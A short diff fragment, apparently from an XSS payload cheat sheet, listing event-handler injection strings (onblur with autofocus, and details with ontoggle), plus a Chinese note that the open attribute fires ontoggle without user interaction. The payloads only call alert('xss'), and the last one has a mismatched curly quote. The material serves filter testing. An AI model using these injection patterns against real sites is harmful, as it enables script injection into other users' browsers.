@@ -29,7 +29,6 @@
 <input onblur=alert("xss") autofocus><input autofocus>
 
 <details>
-
 <details ontoggle="alert('xss');">
 使用open属性触发ontoggle事件，无需用户去触发
 <details open ontoggle="alert('xss');”>
